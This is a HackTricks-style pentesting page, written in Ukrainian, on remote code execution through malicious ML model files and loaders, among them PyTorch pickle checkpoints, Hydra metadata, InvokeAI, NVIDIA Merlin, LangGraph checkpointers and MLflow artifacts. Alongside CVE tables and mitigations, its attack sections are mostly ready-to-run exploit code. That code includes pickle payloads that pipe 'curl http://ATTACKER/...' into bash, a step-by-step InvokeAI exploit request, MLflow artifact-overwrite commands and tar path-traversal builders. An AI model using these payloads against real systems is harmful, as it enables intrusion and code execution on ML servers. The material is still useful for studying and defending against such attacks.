# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Моделі машинного навчання зазвичай поширюють у різних форматах, як-от ONNX, TensorFlow, PyTorch тощо. Їх можна завантажувати на комп’ютери розробників або у виробничі системи для використання. Зазвичай моделі не повинні містити шкідливий код, але в деяких випадках модель може виконувати довільний код у системі як передбачену функцію або через вразливість у бібліотеці завантаження моделей.

У таблиці нижче наведено характерні вразливості цієї категорії:

| **Фреймворк / Інструмент**        | **Вразливість (за наявності CVE)**                                                    | **Вектор RCE**                                                                                                                           | **Джерела**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація в* `torch.load` **(CVE-2025-32434)**                                                              | Шкідливий pickle у контрольній точці моделі призводить до виконання коду (обхід захисту `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + завантаження шкідливої моделі призводить до виконання коду; RCE через десеріалізацію Java в API керування                                        | |
| **NVIDIA Merlin Transformers4Rec** | Небезпечна десеріалізація контрольної точки через `torch.load` **(CVE-2025-23298)**                                           | Недовірена контрольна точка запускає pickle reducer під час виклику `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + небезпечний hook розширення MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Контрольований користувачем ключ `filter` впроваджує синтаксис SQL/JSON-path, `UNION SELECT` створює фальшивий рядок checkpoint, а потім десеріалізація `msgpack` імпортує та викликає обраний зловмисником код Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (небезпечний YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** виконує довільний код Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (розбір TFLite)                                                                                          | Спеціально сформована модель `.tflite` спричиняє переповнення цілого числа → пошкодження heap (потенційний RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle із payload зловмисника в `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (небезпечний `np.load`) *оспорюється*                                                                              | Типовий режим `numpy.load` дозволяв масиви об’єктів із pickle – шкідливий `.npy/.npz` призводить до виконання коду                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (обхід директорій) <br> **CVE-2024-5187** (обхід tar)                                                    | Шлях до зовнішніх ваг моделі ONNX може виходити за межі директорії (читання довільних файлів) <br> Шкідливий tar-файл моделі ONNX може перезаписувати довільні файли (що може призвести до RCE) | |
| ONNX Runtime (ризик конструкції)  | *(Без CVE)* Користувацькі ops / керування потоком ONNX                                                                                    | Для моделі з користувацьким оператором потрібно завантажити нативний код зловмисника; складні графи моделей можуть зловживати логікою для виконання непередбачених обчислень   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (обхід шляху)                                                                                          | Використання API завантаження моделей із ввімкненим `--model-control` дозволяє обійти шлях через відносний шлях і записувати файли (наприклад, перезаписати `.bashrc` для RCE)    | |
| **GGML (формат GGUF)**      | **CVE-2024-25664 … 25668** (численні переповнення heap)                                                                         | Некоректно сформований файл моделі GGUF спричиняє переповнення буфера heap у парсері, що дає змогу виконати довільний код у системі жертви                     | |
| **Keras (старі формати)**   | *(Без нових CVE)* Застаріла модель Keras H5                                                                                         | Шкідлива модель HDF5 (`.h5`) із шаром Lambda усе ще виконує код під час завантаження (Keras safe_mode не поширюється на старий формат – “downgrade attack”) | |
| **Інші** (загалом)        | *Недолік конструкції* – серіалізація Pickle                                                                                         | Багато інструментів ML (наприклад, формати моделей на основі pickle, Python `pickle.load`) виконують довільний код, вбудований у файли моделей, якщо не вжити заходів захисту | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Недовірені метадані передаються до `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Контрольовані зловмисником метадані/конфігурація моделі задають `_target_` довільним викликуваним об’єктом (наприклад, `builtins.exec`) → він виконується під час завантаження навіть із «безпечними» форматами (`.safetensors`, `.nemo`, `config.json` репозиторію) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують моделі на основі Python pickle, як-от моделі [PyTorch](https://github.com/pytorch/pytorch/security), які можуть виконувати довільний код у системі, якщо завантажити їх без `weights_only=True`. Тож будь-яка модель на основі pickle може бути особливо вразливою до цього типу атак, навіть якщо її не наведено в таблиці вище.

### Метадані Hydra → RCE (працює навіть із safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-який крапково-нотаційний `_target_` в об’єкті конфігурації/метаданих. Коли бібліотеки на кшталт Hugging Face Transformers передають **недовірені метадані моделі** до `instantiate()`, зловмисник може вказати викликуваний об’єкт і аргументи, які негайно виконуються під час завантаження моделі (pickle не потрібен).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Приклад payload (працює в `model_config.yaml` файлу `.nemo`, `config.json` репозиторію або `__metadata__` у `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ключові моменти:
- Спрацьовує до ініціалізації моделі в `restore_from/from_pretrained` у NeMo, кодерах uni2TS HuggingFace та завантажувачах FlexTok.
- Список блокування рядків Hydra можна обійти альтернативними шляхами імпорту (наприклад, `enum.bltns.eval`) або іменами, які визначає застосунок (наприклад, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok також аналізує рядкові метадані за допомогою `ast.literal_eval`, що дає змогу спричинити DoS (надмірне використання CPU/пам’яті) до виклику Hydra.

### 🆕  RCE в InvokeAI через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний вебінтерфейс із відкритим кодом для Stable-Diffusion. Версії **5.3.1 – 5.4.2** мають REST endpoint `/api/v2/models/install`, який дає змогу користувачам завантажувати моделі з довільних URL і завантажувати їх у систему.<sup>[[1]](#references)</sup>

Усередині endpoint зрештою викликається:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` виконує **десеріалізацію pickle**. Оскільки вміст надходить безпосередньо з контрольованої користувачем URL-адреси, зловмисник може вбудувати в checkpoint шкідливий об’єкт із власним методом `__reduce__`; цей метод виконується **під час десеріалізації**, що призводить до **віддаленого виконання коду (RCE)** на сервері InvokeAI.

Уразливості присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова інструкція з експлуатації

1. Створіть шкідливий checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Розмістіть `payload.ckpt` на HTTP-сервері під вашим контролем (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливу кінцеву точку (автентифікація не потрібна):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → gadget `os.system` запускається, і зловмисник отримує можливість виконувати код у контексті процесу InvokeAI.

Готовий exploit: модуль **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.<sup>[[3]](#references)</sup>

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням **false**)
•  `/api/v2/models/install` доступний зловмиснику
•  Процес має дозволи на виконання команд оболонки

#### Пом’якшення

* Оновіть до **InvokeAI ≥ 5.4.3** — виправлення встановлює `scan=True` за замовчуванням і виконує перевірку на malware перед десеріалізацією.<sup>[[2]](#references)</sup>
* Під час програмного завантаження checkpoint-файлів використовуйте `torch.load(file, weights_only=True)` або новий допоміжний метод [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Встановіть списки дозволених джерел моделей / підписи та запускайте сервіс із мінімальними привілеями.

> ⚠️ Пам’ятайте, що будь-який формат на основі Python pickle (зокрема багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) за своєю суттю небезпечно десеріалізувати з недовірених джерел.

---

Приклад тимчасового пом’якшення, якщо потрібно й надалі запускати старіші версії InvokeAI за reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE через небезпечний `torch.load` (CVE-2025-23298)

Transformers4Rec від NVIDIA (частина Merlin) використовував небезпечний завантажувач checkpoint, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` покладається на Python `pickle`, контрольований зловмисником checkpoint може виконати довільний код через reducer під час десеріалізації.<sup>[[5]](#references)</sup>

Вразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: у Python pickle об’єкт може визначити reducer (`__reduce__`/`__setstate__`), який повертає callable і аргументи. Callable виконується під час розпакування pickle. Якщо такий об’єкт є в checkpoint, він запускається ще до використання будь-яких ваг.

Мінімальний приклад шкідливого checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Вектори доставки та радіус ураження:
- Троянізовані чекпойнти/моделі, поширені через репозиторії, buckets або реєстри артефактів
- Автоматизовані resume/deploy pipelines, які автоматично завантажують чекпойнти
- Код виконується всередині worker-процесів навчання/інференсу, часто з підвищеними привілеями (наприклад, від root у контейнерах)

Виправлення: у коміті [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) прямий виклик `torch.load()` замінено на обмежений десеріалізатор зі списком дозволених типів, реалізований у `transformers4rec/utils/serialization.py`. Новий завантажувач перевіряє типи/поля та не дозволяє викликати довільні callable-об’єкти під час завантаження.<sup>[[7]](#references)</sup>

Рекомендації щодо захисту, специфічні для чекпойнтів PyTorch:
- Не розпаковуйте pickle-дані з ненадійних джерел. За можливості надавайте перевагу форматам без виконуваного коду, як-от [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX.
- Якщо потрібно використовувати серіалізацію PyTorch, встановіть `weights_only=True` (підтримується в новіших версіях PyTorch) або використовуйте власний unpickler зі списком дозволених типів, подібний до виправлення в Transformers4Rec.<sup>[[4]](#references)</sup>
- Перевіряйте походження/підписи моделей і ізолюйте десеріалізацію в sandbox (seccomp/AppArmor; користувач без root; обмежена файлова система й відсутність вихідного мережевого трафіку).
- Відстежуйте неочікувані дочірні процеси ML-сервісів під час завантаження чекпойнтів; перевіряйте використання `torch.load()`/`pickle`.

POC і посилання на вразливу версію/виправлення:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Вразливий завантажувач до виправлення: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC зі шкідливим чекпойнтом: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Завантажувач після виправлення: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Приклад – створення шкідливої моделі PyTorch

- Створіть модель:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Завантажте модель:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD надає endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що віддалений зловмисник може змусити жертву завантажити шкідливу сторінку/файл, передати на цей endpoint спеціально сформований серіалізований blob і запустити десеріалізацію від імені `root`, що призводить до повної компрометації.

Сценарій експлуатації повторює типове зловживання pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Будь-який gadget, доступний під час десеріалізації (конструктори, `__setstate__`, callbacks фреймворку тощо), можна weaponize так само, незалежно від того, чи передавався payload через HTTP, WebSocket, чи був файлом, скинутим у каталог, за яким ведеться спостереження.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей ланцюжок атак цікавий тим, що зловмиснику **не потрібно завантажувати шкідливий файл моделі**. Натомість застосунок надає API для збереження стану AI-агента (`get_state_history(..., filter=...)`), а введені користувачем дані потрапляють до конструктора запитів checkpointer.

#### 1. Структурна SQLi у фільтрах метаданих

Вразливий шаблон SQLite виглядав так:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Значення прив’язується пізніше, але `query_key` конкатенується в **рядок JSON path**, тож `'` усередині ключа словника виходить за межі `'$.{query_key}'` і впроваджує SQL. Той самий принцип стосується **JSON paths, ідентифікаторів, операторів, `LIMIT` і полів TTL**: плейсхолдери захищають лише значення, а не структурний синтаксис запиту.

#### 2. `UNION SELECT` може націлюватися на подальші sinks, а не лише викрадати дані

Запит повертає `type` і серіалізовані байти `checkpoint`, які згодом використовуються як:

```python
self.serde.loads_typed((type, checkpoint))
```

Це означає, що SQLi в умові `WHERE` може впровадити **підроблений рядок результату**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Якщо подальший код аналізує, десеріалізує, записує або виконує будь-який вибраний стовпець, зіставте ці стовпці з їхніми sinks. У цьому випадку фальшивий рядок перетворює SQLi на **десеріалізацію, контрольовану зловмисником**.

#### 3. Небезпечні extension hooks у MessagePack еквівалентні code gadgets

Шлях `msgpack` у LangGraph використовував власний extension hook, який розпаковував вкладений кортеж і виконував:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Отже, об’єкт розширення MessagePack, що кодує щось еквівалентне `("os", "system", "id > /tmp/pwned")`, імпортує `os`, знаходить `system` і запускає команду. Під час перевірки AI-фреймворків шукайте **власні revivers для MessagePack/JSON/pickle**, які використовують динамічний імпорт, рефлексію або довільний виклик функцій.

#### 4. Практичний шаблон аудиту фреймворків агентів

Перевірте будь-які контрольовані користувачем дані, які потрапляють до:
- API історії стану / пам’яті / відтворення / переліку контрольних точок
- конструкторів структурованих фільтрів, які генерують SQL або фрагменти запитів Redis
- власних десеріалізаторів (`pickle`, `msgpack`, хуків об’єктів `json`, конструкторів YAML)
- шляхів відновлення, які довіряють рядкам, отриманим із рівня збереження

Цей конкретний ланцюжок уражав розгортання LangGraph на власних серверах із контрольними точками **SQLite** або **Redis**, якщо недовірені користувачі могли контролювати `filter`. У розкритті вказано такі виправлені версії: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` і `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Перезапис артефакту MLflow PyFunc до RCE через pickle

MLflow PyFunc, створений на основі `PythonModel`, може зберігати серіалізований об’єкт як `python_model.pkl`. Метадані моделі вказують `mlflow.pyfunc.model` як завантажувач, а реалізація MLflow використовує це ім’я файлу для збереженої моделі Python. Отже, право на запис до сховища артефактів може призвести до виконання коду в іншій програмі, яка згодом завантажить модель.<sup>[[17]](#references)[[18]](#references)</sup>

Корисний ланцюжок такий: **дозвіл на запис артефактів → заміна pickle → повторне завантаження моделлю-споживачем для інференсу**. Для експерименту, що використовує кореневий шлях `mlflow-artifacts:/...` із проксіюванням, перелічіть експеримент, запуск і шлях до артефактів моделі. Сервер відстеження надає `GET` і `PUT` для `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Мінімальний reducer може виконати команду, щойно споживач розпакує артефакт за допомогою unpickle. Генерація payload за допомогою версії Python, зазначеної в `MLmodel`, допомагає уникнути проблем із сумісністю.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Запустіть операцію, яка **завантажує наявну модель**, наприклад прогнозування, оцінювання або розгортання. Не запускайте навчання перед цим, оскільки воно може замінити шкідливий артефакт новою моделлю. Помилка застосунку не спростовує експлуатацію: reducer повертає цілий код завершення команди замість придатної до використання моделі. Спочатку перевірте спостережуваний побічний ефект, наприклад ICMP або HTTP callback, а потім замініть його на остаточний payload.<sup>[[20]](#references)</sup>

Під час оцінювання розрізняйте дозвіл на створення run і дозвіл на перезапис артефактів, що належать іншому run. Перевірте автентифікацію та права на оновлення для кожного run, дослідіть несподівані зміни `python_model.pkl` і вважайте походження та цілісність моделі частиною межі виконання. Поточний код MLflow також підтримує встановлення `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` і рекомендує використовувати артефакти models-from-code замість завантаження даних cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Відкриті сервери моделей та ML-інфраструктура

Завантаження шкідливої моделі — не єдиний спосіб виконати код на ML-інфраструктурі. API надсилання завдань, кінцеві точки перевірки коду та завантаження моделей із реєстрів у self-hosted AI-сервісах можуть призвести до виконання коду без будь-якого файлу моделі. Див. [Відкриті self-hosted AI-сервіси](AI-Exposed-Self-Hosted-AI-Services.md).

## Обхід шляхів у моделях

Як зазначено в [**цій публікації блогу**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, що використовуються різними AI-фреймворками, базуються на архівах, зазвичай `.zip`. Тому ці формати потенційно можна використати для атак із обходом шляхів, що дасть змогу читати довільні файли в системі, де завантажується модель.<sup>[[16]](#references)</sup>

Наприклад, за допомогою наведеного коду можна створити модель, яка під час завантаження створить файл у каталозі `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Або за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створюватиме symlink на каталог `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Детальний розбір: десеріалізація Keras .keras і пошук gadget

Щоб ознайомитися з внутрішньою будовою .keras, RCE через Lambda-layer, проблемою довільного імпорту у версіях ≤ 3.8 і пошуком gadget після виправлення серед allowlist, дивіться:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Блог OffSec – "CVE-2024-12029 – Десеріалізація ненадійних даних в InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Коміт із виправлення InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Документація модуля Metasploit від Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – міркування щодо безпеки для torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Блог ZDI – CVE-2025-23298: отримання віддаленого виконання коду в NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Рекомендація ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Коміт із виправлення Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Завантажувач із вразливістю до виправлення (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC зі шкідливою контрольною точкою (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Завантажувач після виправлення (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Віддалене виконання коду в сучасних форматах і бібліотеках AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Документація Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Коміт із блок-листом Hydra (попередження про RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – від SQLi до RCE: експлуатація checkpointer LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Перетворення вразливостей Archive Slip на високоцінні баунті AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Рекомендація Snyk і PoC для PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Вихідний код MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API MLflow – кінцеві точки завантаження й вивантаження артефактів](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
